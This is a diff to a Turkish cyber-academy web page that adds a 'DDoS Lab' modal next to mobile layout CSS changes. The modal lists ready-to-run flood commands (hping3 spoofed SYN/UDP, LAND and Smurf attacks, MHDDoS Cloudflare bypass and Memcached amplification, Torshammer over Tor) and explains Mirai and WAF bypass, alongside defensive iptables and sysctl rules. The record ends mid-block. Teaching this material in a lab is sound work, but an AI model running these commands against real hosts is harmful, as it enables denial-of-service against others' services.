@@ -61,14 +61,32 @@
         .academy-brand-logo {
             width: 34px;
             height: 34px;
-            border-radius: 8px;
-            background: linear-gradient(135deg, rgba(0, 229, 255, 0.2), rgba(37, 99, 235, 0.3));
-            border: 1px solid var(--cyan, #00e5ff);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            box-shadow: 0 0 14px rgba(0, 229, 255, 0.3);
+            border-radius: 9px;
+            background: radial-gradient(circle at 50% 50%, rgba(16, 185, 129, 0.25), rgba(8, 13, 28, 0.95)) !important;
+            border: 1px solid rgba(52, 211, 153, 0.55) !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            box-shadow: 0 0 16px rgba(16, 185, 129, 0.4), inset 0 0 10px rgba(16, 185, 129, 0.15) !important;
+            position: relative !important;
+            overflow: hidden !important;
+            transition: all 0.28s ease !important;
+        }
+        .academy-brand-logo:hover {
+            transform: translateY(-2px) scale(1.05) !important;
+            border-color: #34d399 !important;
+            box-shadow: 0 0 24px rgba(52, 211, 153, 0.65), inset 0 0 14px rgba(0, 229, 255, 0.25) !important;
+        }
+        .academy-brand-logo::after {
+            content: '';
+            position: absolute;
+            top: -120%;
+            left: -20%;
+            width: 140%;
+            height: 140%;
+            background: linear-gradient(180deg, transparent 0%, rgba(52, 211, 153, 0.25) 50%, transparent 100%);
+            pointer-events: none;
+            animation: shieldScan 4s ease-in-out infinite;
         }
 
         .academy-brand-text {
@@ -2010,9 +2028,9 @@
             background: rgba(8, 13, 28, 0.96);
             border-bottom: 1px solid rgba(0, 229, 255, 0.22);
             box-sizing: border-box;
-            position: sticky;
-            top: 0;
-            z-index: 50;
+            position: relative !important;
+            top: auto !important;
+            z-index: 20 !important;
         }
 
         .mob-view-btn {
@@ -3666,14 +3684,13 @@
         .academy-brand-logo {
             width: 32px !important;
             height: 32px !important;
-            border-radius: 10px !important;
-            background: linear-gradient(135deg, rgba(56, 189, 248, 0.25), rgba(99, 102, 241, 0.3)) !important;
-            border: 1px solid rgba(56, 189, 248, 0.6) !important;
+            border-radius: 9px !important;
+            background: rgba(16, 185, 129, 0.12) !important;
+            border: 1px solid rgba(16, 185, 129, 0.45) !important;
             display: flex !important;
             align-items: center !important;
             justify-content: center !important;
-            font-size: 16px !important;
-            box-shadow: 0 0 14px rgba(56, 189, 248, 0.3) !important;
+            box-shadow: 0 0 14px rgba(16, 185, 129, 0.35) !important;
         }
 
         .academy-brand-title {
@@ -4171,6 +4188,332 @@
             line-height: 1.45;
         }
     
+
+
+        /* ==========================================================================
+           PRECISION ZERO-OVERLAP & ZERO-SQUEEZE MOBILE SUITE FOR SİBER AKADEMİ (<= 900px)
+           Fixes:
+           ✔ Hides desktop view switcher (.nav-zone-center / #view-mode-selector) on mobile
+           ✔ Prevents .mobile-view-tabs from overlapping or covering the navbar
+           ✔ Keeps .academy-navbar locked to single clean 56px row without wrap blowout
+           ✔ Positions [Saha Kılavuzu] and [Canlı Terminal] directly below navbar smoothly
+           ========================================================================== */
+        @media (max-width: 900px) {
+            html, body.academy-body {
+                height: auto !important;
+                max-height: none !important;
+                overflow-y: auto !important;
+                overflow-x: hidden !important;
+                width: 100% !important;
+                max-width: 100% !important;
+            }
+
+            /* Single-row clean navbar, zero multi-line stacking */
+            .academy-navbar {
+                height: 56px !important;
+                min-height: 56px !important;
+                max-height: 56px !important;
+                padding: 0 12px !important;
+                display: flex !important;
+                align-items: center !important;
+                justify-content: space-between !important;
+                flex-wrap: nowrap !important;
+                overflow: hidden !important;
+                position: sticky !important;
+                top: 0 !important;
+                z-index: 100 !important;
+                width: 100% !important;
+                box-sizing: border-box !important;
+            }
+
+            .nav-zone-left {
+                display: flex !important;
+                align-items: center !important;
+                gap: 8px !important;
+                flex-shrink: 0 !important;
+            }
+
+            .academy-brand-subtitle {
+                display: none !important;
+            }
+
+            .academy-brand-title {
+                font-size: 13px !important;
+            }
+
+            .btn-toggle-rooms-drawer {
+                padding: 5px 10px !important;
+                font-size: 11px !important;
+                gap: 5px !important;
+            }
+
+            .drawer-active-tag {
+                display: none !important;
+            }
+
+            /* HIDE REDUNDANT DESKTOP VIEW MODE SWITCHER ON MOBILE */
+            .nav-zone-center,
+            #view-mode-selector,
+            .view-mode-selector {
+                display: none !important;
+                visibility: hidden !important;
+                width: 0 !important;
+                height: 0 !important;
+                overflow: hidden !important;
+            }
+
+            /* Compact utility icon bar on mobile */
+            .nav-zone-right {
+                width: auto !important;
+                display: flex !important;
+                align-items: center !important;
+                gap: 6px !important;
+                flex-shrink: 1 !important;
+                overflow-x: auto !important;
+                -webkit-overflow-scrolling: touch !important;
+                scrollbar-width: none !important;
+                justify-content: flex-end !important;
+            }
+
+            .nav-zone-right::-webkit-scrollbar {
+                display: none !important;
+            }
+
+            .acad-util-btn,
+            .btn-role-quiz {
+                height: 34px !important;
+                padding: 0 8px !important;
+                font-size: 11.5px !important;
+                flex-shrink: 0 !important;
+            }
+
+            /* Hide verbose text labels inside navbar right buttons on mobile, keep clean icons */
+            .nav-btn-label,
+            #speedrun-display,
+            .academy-progress-container {
+                display: none !important;
+            }
+
+            /* CRITICAL: .mobile-view-tabs flows naturally DIRECTLY UNDER the navbar */
+            .mobile-view-tabs {
+                display: flex !important;
+                position: relative !important;
+                top: auto !important;
+                z-index: 20 !important;
+                width: 100% !important;
+                margin: 0 !important;
+                padding: 8px 12px !important;
+                background: rgba(8, 13, 28, 0.98) !important;
+                border-bottom: 1px solid rgba(0, 229, 255, 0.22) !important;
+                box-sizing: border-box !important;
+                gap: 8px !important;
+            }
+
+            .mob-view-btn {
+                padding: 9px 12px !important;
+                font-size: 12.5px !important;
+                border-radius: 8px !important;
+            }
+
+            /* Cockpit & HUD Header Mobile Cleanliness */
+            .academy-theory-panel,
+            .cockpit-panel-container {
+                padding: 14px 10px 40px 10px !important;
+                width: 100% !important;
+                box-sizing: border-box !important;
+            }
+
+            .cockpit-hud-header {
+                padding: 14px 12px !important;
+                gap: 10px !important;
+                border-radius: 12px !important;
+                width: 100% !important;
+                box-sizing: border-box !important;
+            }
+
+            .hud-mission-title {
+                font-size: 16px !important;
+                line-height: 1.4 !important;
+                word-break: break-word !important;
+            }
+
+            .hud-left-group {
+                display: flex !important;
+                flex-wrap: wrap !important;
+                gap: 6px !important;
+            }
+
+            .hud-track-pill,
+            .hud-level-pill,
+            .hud-room-code {
+                font-size: 10px !important;
+                padding: 3px 8px !important;
+            }
+
+            .hud-nav-controls {
+                gap: 6px !important;
+            }
+
+            .btn-hud-nav {
+                padding: 5px 10px !important;
+                font-size: 11px !important;
+            }
+
+            .hud-xp-badge {
+                padding: 4px 8px !important;
+                font-size: 11px !important;
+            }
+
+            .cyber-cockpit-stage {
+                gap: 14px !important;
+            }
+
+            .room-mission-card {
+                padding: 14px 12px !important;
+            }
+
+            .mission-text {
+                font-size: 12.5px !important;
+            }
+        }
+
+
+        /* =========================================================
+           DDOS LAB MODAL & TAB BAR PRECISION RESPONSIVE SUITE
+           Eliminates text-wrapping cutoffs & ensures silky horizontal scroll
+           ========================================================= */
+        .ddos-tab-bar {
+            display: flex !important;
+            gap: 8px !important;
+            padding: 12px 18px !important;
+            background: rgba(3, 7, 18, 0.95) !important;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1) !important;
+            overflow-x: auto !important;
+            overflow-y: hidden !important;
+            flex-wrap: nowrap !important;
+            -webkit-overflow-scrolling: touch !important;
+            scrollbar-width: thin !important;
+            align-items: center !important;
+            min-height: 60px !important;
+            box-sizing: border-box !important;
+            width: 100% !important;
+        }
+
+        .ddos-tab-bar::-webkit-scrollbar {
+            height: 5px !important;
+        }
+
+        .ddos-tab-bar::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.4) !important;
+        }
+
+        .ddos-tab-bar::-webkit-scrollbar-thumb {
+            background: rgba(239, 68, 68, 0.45) !important;
+            border-radius: 4px !important;
+        }
+
+        .ddos-tab-btn {
+            white-space: nowrap !important;
+            flex-shrink: 0 !important;
+            display: inline-flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            gap: 6px !important;
+            padding: 10px 18px !important;
+            min-height: 40px !important;
+            height: auto !important;
+            line-height: 1.2 !important;
+            font-size: 12.5px !important;
+            font-weight: 700 !important;
+            border-radius: 9px !important;
+            box-sizing: border-box !important;
+            transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1) !important;
+            text-align: center !important;
+        }
+
+        .ddos-tab-btn:hover {
+            transform: translateY(-1px) !important;
+            filter: brightness(1.15) !important;
+        }
+
+        .ddos-tab-content-area {
+            overflow-y: auto !important;
+            -webkit-overflow-scrolling: touch !important;
+            box-sizing: border-box !important;
+            max-width: 100% !important;
+            word-break: break-word !important;
+        }
+
+        .ddos-tab-pane pre,
+        .ddos-tab-pane code,
+        .ddos-tab-pane div[style*="font-family: monospace"] {
+            max-width: 100% !important;
+            box-sizing: border-box !important;
+            overflow-x: auto !important;
+            word-break: break-all !important;
+            white-space: pre-wrap !important;
+        }
+
+        @media (max-width: 900px) {
+            #ddos-academy-modal {
+                padding: 10px !important;
+            }
+            #ddos-academy-modal .quiz-modal-card {
+                width: 100% !important;
+                max-width: 100% !important;
+                max-height: 94vh !important;
+                border-radius: 12px !important;
+            }
+            #ddos-academy-modal .quiz-modal-header {
+                padding: 12px 14px !important;
+            }
+            #ddos-academy-modal .quiz-modal-header-left span {
+                font-size: 20px !important;
+            }
+            #ddos-academy-modal .quiz-modal-header-left div div:first-child {
+                font-size: 12px !important;
+                letter-spacing: 0.8px !important;
+                line-height: 1.3 !important;
+            }
+            #ddos-academy-modal .quiz-modal-header-left div div:last-child {
+                font-size: 10px !important;
+            }
+            .ddos-tab-bar {
+                padding: 10px 12px !important;
+                min-height: 56px !important;
+            }
+            .ddos-tab-btn {
+                padding: 8px 14px !important;
+                font-size: 12px !important;
+                min-height: 36px !important;
+            }
+            .ddos-tab-content-area {
+                padding: 16px 14px !important;
+            }
+        }
+
+
+        /* Guaranteed Mobile Visibility for DDoS Lab Button */
+        #btn-open-ddos-guide {
+            display: inline-flex !important;
+            align-items: center !important;
+            gap: 5px !important;
+            padding: 0 10px !important;
+            background: rgba(239, 68, 68, 0.22) !important;
+            border: 1px solid #ef4444 !important;
+            color: #ffffff !important;
+            border-radius: 8px !important;
+            flex-shrink: 0 !important;
+            height: 34px !important;
+        }
+
+        #btn-open-ddos-guide .nav-btn-label {
+            display: inline-block !important;
+            color: #fca5a5 !important;
+            font-weight: 800 !important;
+            font-size: 11px !important;
+        }
+
 </style>
 </head>
 
@@ -4181,7 +4524,7 @@
         <!-- Zone 1 (Left): Brand + Room Drawer Pill -->
         <div class="nav-zone-left">
             <a href="index.html" class="academy-brand" title="Ana Sayfaya Dön">
-                <span class="academy-brand-logo">⚔️</span>
+                <span class="academy-brand-logo"><img src="lfl_symbol.png" alt="LFL Logo" class="lfl-badge-rune" /></span>
                 <div class="academy-brand-text">
                     <span class="academy-brand-title">LFL CYBER</span>
                     <span class="academy-brand-subtitle">ACADEMY</span>
@@ -4189,9 +4532,9 @@
             </a>
 
             <!-- Slide-out Rooms Drawer Toggle Button -->
-            <button type="button" class="btn-toggle-rooms-drawer" id="btn-toggle-rooms-drawer" title="Eğitim Odaları Listesi (69)">
+            <button type="button" class="btn-toggle-rooms-drawer" id="btn-toggle-rooms-drawer" title="Eğitim Odaları Listesi (71)">
                 <span class="drawer-hamburger">☰</span>
-                <span class="drawer-label">Odalar (69)</span>
+                <span class="drawer-label">Odalar (71)</span>
                 <span class="drawer-active-tag" id="drawer-active-tag">STARTER-01</span>
             </button>
         </div>
@@ -4216,6 +4559,11 @@
 
         <!-- Zone 3 (Right): Utilities + Progress + Exit -->
         <div class="nav-zone-right">
+            <!-- 🐉 DDoS Lab & Kılavuz -->
+            <button type="button" class="acad-util-btn" id="btn-open-ddos-guide" title="LFL DDoS Lab & Protokol Kılavuzu" style="border: 1px solid rgba(239, 68, 68, 0.45); background: rgba(239, 68, 68, 0.1); color: #f87171;">
+                <span>🐉</span>
+                <span class="nav-btn-label" style="font-weight: 700; color: #fca5a5;">DDoS Lab</span>
+            </button>
             <!-- Ses Efektleri -->
             <button type="button" class="acad-util-btn active-mode" id="btn-toggle-sfx" title="Terminal Ses Efektlerini Aç/Kapat">
                 <span id="sfx-icon">🔊</span>
@@ -4314,11 +4662,14 @@
         <!-- Mobile View Segment Switcher (<= 900px) -->
         <div class="mobile-view-tabs" id="mobile-view-tabs">
             <button type="button" class="mob-view-btn active" id="mob-btn-dossier">
-                <span>📖 Saha Kılavuzu (1-4)</span>
+                <span>📖 Kılavuz (1-4)</span>
             </button>
             <button type="button" class="mob-view-btn" id="mob-btn-terminal">
                 <span>💻 Canlı Terminal</span>
                 <span class="mob-pulse-dot"></span>
+            </button>
+            <button type="button" class="mob-view-btn" id="mob-btn-open-ddos" title="LFL DDoS Lab & Protokol Kılavuzu" style="background: rgba(239, 68, 68, 0.22); border: 1px solid #ef4444; color: #fca5a5; font-weight: 800; flex: 0 0 auto;">
+                <span>🐉 DDoS Lab</span>
             </button>
         </div>
 
@@ -4672,6 +5023,237 @@
             </div>
             <div class="quiz-modal-body">
                 <!-- Dynamically rendered question or result by js/academy_engine.js -->
+            </div>
+        </div>
+    </div>
+
+    
+    <!-- 🐉 LFL // LOST FROM LIGHT — DISTRIBUTED DENIAL OF SERVICE (DDoS) ACADEMY MODAL -->
+    <div class="quiz-modal-backdrop" id="ddos-academy-modal" style="display: none; position: fixed; inset: 0; z-index: 9999; background: rgba(3, 7, 18, 0.88); backdrop-filter: blur(8px); align-items: center; justify-content: center; padding: 20px;">
+        <div class="quiz-modal-card" style="width: 100%; max-width: 1050px; max-height: 90vh; background: #070d1e; border: 1px solid rgba(239, 68, 68, 0.35); border-radius: 16px; box-shadow: 0 0 50px rgba(239, 68, 68, 0.2); display: flex; flex-direction: column; overflow: hidden;">
+            <div class="quiz-modal-header" style="padding: 16px 24px; border-bottom: 1px solid rgba(239, 68, 68, 0.25); background: linear-gradient(90deg, rgba(239, 68, 68, 0.12), transparent); display: flex; align-items: center; justify-content: space-between;">
+                <div class="quiz-modal-header-left" style="display: flex; align-items: center; gap: 12px;">
+                    <span style="font-size: 22px;">🐉</span>
+                    <div>
+                        <div style="font-size: 14px; font-weight: 800; font-family: monospace; color: #f87171; letter-spacing: 1.5px;">LFL // LOST FROM LIGHT — DISTRIBUTED DENIAL OF SERVICE (DDoS) ACADEMY</div>
+                        <div style="font-size: 11px; color: #94a3b8; font-family: monospace;">MODULE: NETWORK LAYER FLOOD VS. APPLICATION LAYER BYPASS (THE COMPREHENSIVE LAB)</div>
+                    </div>
+                </div>
+                <button type="button" class="quiz-close-btn" id="ddos-modal-close-btn" style="background: none; border: none; font-size: 24px; color: #94a3b8; cursor: pointer; padding: 4px 8px; line-height: 1;">&times;</button>
+            </div>
+
+            <!-- Tab Buttons -->
+            <div class="ddos-tab-bar">
+                <button type="button" class="ddos-tab-btn active" data-tab="tab-tools" style="background: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; color: #fff; cursor: pointer;">📌 Saldırı Araçları</button>
+                <button type="button" class="ddos-tab-btn" data-tab="tab-protocol" style="background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.12); color: #94a3b8; cursor: pointer;">🔬 Protokol Derin Analiz</button>
+                <button type="button" class="ddos-tab-btn" data-tab="tab-botnet" style="background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.12); color: #94a3b8; cursor: pointer;">🕸️ Mirai Botnet & C2</button>
+                <button type="button" class="ddos-tab-btn" data-tab="tab-blue" style="background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.12); color: #94a3b8; cursor: pointer;">🪵 Blue Team Telemetri</button>
+                <button type="button" class="ddos-tab-btn" data-tab="tab-defense" style="background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.12); color: #94a3b8; cursor: pointer;">🛡️ Defans Matrisi (iptables & sysctl)</button>
+                <button type="button" class="ddos-tab-btn" data-tab="tab-troubleshoot" style="background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.12); color: #94a3b8; cursor: pointer;">🛠️ VMware Lab & Sorun Giderme</button>
+            </div>
+
+            <!-- Tab Contents -->
+            <div class="ddos-tab-content-area" style="overflow-y: auto; padding: 24px; flex: 1; font-size: 13.5px; line-height: 1.6; color: #e2e8f0;">
+                
+                <!-- TAB 1: ARAÇLAR -->
+                <div class="ddos-tab-pane active" id="pane-tab-tools">
+                    <h3 style="color: #f87171; margin-top: 0;">📌 TOOL #1: hping3 (The Raw Network Hammer)</h3>
+                    <p><code>hping3</code>, TCP/IP protokol yığınını manipüle ederek ham (raw) paketler üreten ve gönderen bir komut satırı aracıdır. Standart ping (ICMP) araçlarından farkı; TCP, UDP ve RAW-IP paketlerini bayrak düzeyinde (SYN, ACK, RST, FIN) özelleştirebilmesidir.</p>
+                    <ul style="padding-left: 20px;">
+                        <li><strong>Volumetrik Saldırı (Saf Güç):</strong> <code>--flood</code> parametresiyle ağ kartının (NIC) ve işlemcinin (CPU) sınırlarını zorlar; yanıt paketlerini beklemeden milisaniyeler içinde milyonlarca sahte paket fırlatır.</li>
+                        <li><strong>Kaynak Gizleme (IP Spoofing):</strong> <code>--rand-source</code> parametresiyle ağ katmanındaki Source IP başlığı her pakette rastgele değiştirilir.</li>
+                    </ul>
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #38bdf8;">
+                        # SYN Flood (Sahte Kaynak IP ve Maksimum Hızda Kaba Kuvvet)<br>
+                        <strong>sudo hping3 --flood --rand-source -S -p 80 10.10.1.5</strong><br><br>
+                        # Veri Yüklü SYN Flood (RAM &amp; Bant Genişliği Tüketimi)<br>
+                        <strong>sudo hping3 -S --flood --rand-source -d 120 -p 80 10.10.1.5</strong><br><br>
+                        # UDP Flood (Bağlantısız Protokol Boğması)<br>
+                        <strong>sudo hping3 --udp --flood --rand-source -p 53 10.10.1.5</strong><br><br>
+                        # LAND Attack (Sunucunun kendi kendine paket fırlatması)<br>
+                        <strong>sudo hping3 -S -a 192.168.1.50 -k -s 80 -p 80 --flood 192.168.1.50</strong><br><br>
+                        # Smurf Attack (Yerel ağdaki tüm cihazları kurbana ping atmaya zorlar)<br>
+                        <strong>sudo hping3 -1 -a 192.168.1.50 192.168.1.255 --flood</strong>
+                    </div>
+
+                    <h3 style="color: #38bdf8; margin-top: 24px;">📌 TOOL #2: MHDDoS &amp; Modern L7 Load Testers (The Layer 7 Swiss Army Knife)</h3>
+                    <p>MHDDoS, Python 3 mimarisi üzerinde yükselen, hem ağ katmanını (L4) hem uygulama katmanını (L7) hedef alabilen en gelişmiş açık kaynaklı test aracıdır. Bünyesinde 50'den fazla özel saldırı vektörü ve anti-DDoS atlatma modülü barındırır.</p>
+                    <ul style="padding-left: 20px;">
+                        <li><strong>İnsan Davranışı Emülasyonu:</strong> Kurban web sitesine gerçek kullanıcı gibi girer, JavaScript kodlarını çalıştırır, çerezleri (cookies) işler.</li>
+                        <li><strong>WAF / CDN Atlatma:</strong> Cloudflare ve Akamai'nin "Browser Challenge" mekanizmalarını aşacak motorlara sahiptir.</li>
+                        <li><strong>Proxy Rotasyonu:</strong> İnternetten binlerce güncel proxy çekip saniyede bir IP değiştirerek Rate Limit kurallarını atlatır.</li>
+                    </ul>
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #38bdf8;">
+                        # Layer 7 Cloudflare/WAF Atlatma Saldırısı (Akıllı Mod)<br>
+                        <strong>python3 start.py CFB https://target.com 5 1000 proxy.txt 100 300</strong><br><br>
+                        # Memcached / NTP Amplification (100-500 kat Yansıtma ve Büyütme)<br>
+                        <strong>python3 start.py MEMCACHED 10.10.1.5 5 1000 reflectors.txt</strong><br><br>
+                        # Kapalı VMware Lab Ortamı İçin Yüksek Hızlı HTTP Flood (wrk)<br>
+                        <strong>wrk -t12 -c400 -d30s http://10.10.1.5/</strong><br><br>
+                        # Web Sitesinin İşlemcisini ve Veritabanını (SQL) İçeriden Kilitleme<br>
+                        <strong>python3 start.py STRESS http://192.168.1.50:80 5 500 socks5.txt 100 2000</strong>
+                    </div>
+
+                    <h3 style="color: #fbbf24; margin-top: 24px;">📌 TOOL #3: Torshammer &amp; slowhttptest (The Slow Assassin)</h3>
+                    <p>Tor ağ altyapısını yerleşik olarak destekleyen, yavaş ve sinsi saldırı (Slowloris / Slow Read) ekolünün en temiz örnekleridir. Amacı hedef hattı yüksek trafikle tıkamak değil, sunucunun işleme kapasitesini sessizce felç etmektir.</p>
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #38bdf8;">
+                        # Tor Ağı Üzerinden Anonim Slowloris Saldırısı<br>
+                        <strong>python2 torshammer.py -t 10.10.1.5 -p 80 -r 256 -T</strong><br><br>
+                        # Modern Kali Linux Ortamı İçin C Tabanlı Slowloris Testi<br>
+                        <strong>slowhttptest -c 1000 -H -g -o slow_rapor -i 10 -r 200 -t GET -u http://10.10.1.5 -x 24 -p 3</strong>
+                    </div>
+                </div>
+
+                <!-- TAB 2: PROTOKOL ANALİZİ -->
+                <div class="ddos-tab-pane" id="pane-tab-protocol" style="display: none;">
+                    <h3 style="color: #f87171; margin-top: 0;">🔬 PROTOKOL SEVİYESİNDE DERİN ANALİZ (DEEP DIVE)</h3>
+                    <h4>1. TCP SYN Flood ve İşletim Sistemi Çekirdek (Kernel) İstismarı</h4>
+                    <p><code>hping3 -S --flood</code> çalıştırıldığında, saldırı sadece ağ hattını değil, doğrudan işletim sisteminin <strong>TCP/IP yığın mimarisini</strong> hedef alır.</p>
+                    <ul style="padding-left: 20px;">
+                        <li><strong>Yarı Açık Bağlantı (Half-Open Connection) Durumu:</strong> Standart bir TCP el sıkışmasında (Three-Way Handshake) istemci <code>SYN</code> gönderir, sunucu <code>SYN-ACK</code> ile döner ve istemciden <code>ACK</code> bekler. <code>--rand-source</code> kullanıldığında sahte IP adresleri internette olmadığı için sunucunun <code>SYN-ACK</code> paketleri boşa gider ve asla <code>ACK</code> alamayacağı bir döngüye girer.</li>
+                        <li><strong>SYN Backlog Kuyruğu İstismarı:</strong> Linux çekirdeği (Kernel), el sıkışması tamamlanmamış bu bağlantıları <strong>SYN Backlog</strong> adı verilen sınırlı bir bellek kuyruğunda (<code>tcp_max_syn_backlog</code>) tutar. Kuyruk dolduğunda sunucu yasal kullanıcılar dahil yeni hiçbir SYN paketini kabul edemez ve <code>Connection Refused</code> üretir.</li>
+                    </ul>
+
+                    <h4>2. UDP ve ICMP Storm Mekanizması</h4>
+                    <p><code>hping3 --udp --flood</code> saldırılarında amaç işletim sisteminin ağ soketlerini (Sockets) kilitlemektir.</p>
+                    <ul style="padding-left: 20px;">
+                        <li><strong>ICMP Port Unreachable Döngüsü:</strong> O portta dinleme yapan aktif bir UDP servisi yoksa, Linux çekirdeği paketi gönderen kaynağa <strong>ICMP Type 3 Code 3 (Destination Port Unreachable)</strong> paketi üretip göndermeye zorlanır. Saniyede 1 milyon UDP paketi geldiğinde, sunucu saniyede 1 milyon ICMP üretmeye çalışırken işlemcisini (CPU) tamamen kilitler.</li>
+                    </ul>
+                </div>
+
+                <!-- TAB 3: BOTNET & C2 -->
+                <div class="ddos-tab-pane" id="pane-tab-botnet" style="display: none;">
+                    <h3 style="color: #a855f7; margin-top: 0;">🕸️ BOTNET VE KOMUTA KONTROL (C2) MİMARİSİ</h3>
+                    <h4>1. Mirai Botnet Modelinin Anatomisi</h4>
+                    <ol style="padding-left: 20px;">
+                        <li><strong>Tarama (Scanning):</strong> Telnet (Port 23) ve SSH (Port 22) açık olan IoT cihazlarını tarar ve 60'tan fazla varsayılan şifre listesini dener.</li>
+                        <li><strong>Yükleme (Loading):</strong> Giriş başarılı olduğunda mimariyi (ARM, MIPS, x86) tespit edip uygun bot ikilisini cihaza indirip bellekte çalıştırır.</li>
+                        <li><strong>Raporlama &amp; Emir:</strong> C2 (Command &amp; Control) sunucusuna IP'sini bildirerek zombi ordusuna katılır.</li>
+                    </ol>
+
+                    <h4>2. Uygulama Katmanı (Layer 7) Bypass Mekanizmaları</h4>
+                    <p>MHDDoS'un <code>CFB</code> (Cloudflare Bypass) modu Reverse Proxy mimarisini manipüle eder:</p>
+                    <ul style="padding-left: 20px;">
+                        <li><strong>Cookie ve Session Taklidi:</strong> Cloudflare'in JavaScript doğrulamalarını çözmek için arka planda headless tarayıcı (Puppeteer / Playwright) çalıştırır, <code>cf_clearance</code> çerezini kapar ve arkasından gelen isteklere bu çerezi ekleyerek korumayı atlatır.</li>
+                    </ul>
+                </div>
+
+                <!-- TAB 4: BLUE TEAM TELEMETRİ -->
+                <div class="ddos-tab-pane" id="pane-tab-blue" style="display: none;">
+                    <h3 style="color: #38bdf8; margin-top: 0;">🪵 GERÇEK DÜNYA TELEMETRİSİ: LOG ANALİZİ &amp; CANLI İZLEME</h3>
+                    
+                    <h4>1. Canlı SYN Backlog Kuyruğu İzleme (ss &amp; watch)</h4>
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #38bdf8;">
+                        # Yarı açık (SYN-RECV) bağlantıların sayısını canlı sayar<br>
+                        <strong>watch -n 1 "ss -tan | grep SYN-RECV | wc -l"</strong>
+                    </div>
+
+                    <h4>2. tcpdump Paket Analizi Örneği (hping3 SYN Flood)</h4>
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #94a3b8;">
+                        11:42:01.102943 IP (flags [S], proto TCP (6), length 40) 192.168.1.142.43219 &gt; 10.10.1.5.80: Flags [S], seq 1092384, win 512<br>
+                        11:42:01.102955 IP (flags [S], proto TCP (6), length 40) 201.44.12.99.11243 &gt; 10.10.1.5.80: Flags [S], seq 4123984, win 512
+                    </div>
+
+                    <h4>3. Nginx Web Sunucusu access.log Analizi (Torshammer / Slowloris)</h4>
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #f59e0b;">
+                        185.220.101.4 - - [24/Nov/2026:11:43:12 +0300] "GET / HTTP/1.1" <strong>408</strong> 0 "-" "Mozilla/5.0..."<br>
+                        185.220.101.5 - - [24/Nov/2026:11:43:45 +0300] "GET / HTTP/1.1" <strong>408</strong> 0 "-" "Mozilla/5.0..."
+                    </div>
+                </div>
+
+                <!-- TAB 5: DEFANS MATRİSİ -->
+                <div class="ddos-tab-pane" id="pane-tab-defense" style="display: none;">
+                    <h3 style="color: #10b981; margin-top: 0;">🛡️ PURPLE TEAM MATRIX: DEFENSIVE MITIGATION STRATEGIES</h3>
+                    
+                    <table style="width: 100%; border-collapse: collapse; margin-bottom: 20px; font-size: 13px;">
+                        <thead>
+                            <tr style="background: rgba(255,255,255,0.06); text-align: left;">
+                                <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Tehdit Vektörü</th>
+                                <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Saldırı Tipi</th>
+                                <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Araç</th>
+                                <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Defansif Çözüm &amp; Engelleme Komutu</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold; color: #f87171;">Volumetrik Boğma</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">L4 SYN / UDP Flood</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><code>hping3 --flood</code></td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><strong>SYN Cookie &amp; UFW Rate Limiting:</strong><br><code>sudo sysctl -w net.ipv4.tcp_syncookies=1</code><br><code>sudo ufw limit proto tcp from any to any port 80</code></td>
+                            </tr>
+                            <tr>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold; color: #38bdf8;">Akıllı Bot Trafiği</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">L7 Bypass / Proxy</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><code>MHDDoS CFB / wrk</code></td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><strong>Davranışsal WAF &amp; Connlimit:</strong><br><code>sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 32 -j DROP</code></td>
+                            </tr>
+                            <tr>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold; color: #fbbf24;">Yavaş Slot İşgali</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">L7 Slowloris</td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><code>Torshammer / slowhttptest</code></td>
+                                <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);"><strong>Timeout Sıkılaştırma:</strong><br>Nginx: <code>client_header_timeout 10s;</code><br>Apache: <code>RequestReadTimeout header=10-20,MinRate=500</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <div style="background: #020617; border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; padding: 12px; margin: 12px 0; font-family: monospace; color: #38bdf8;">
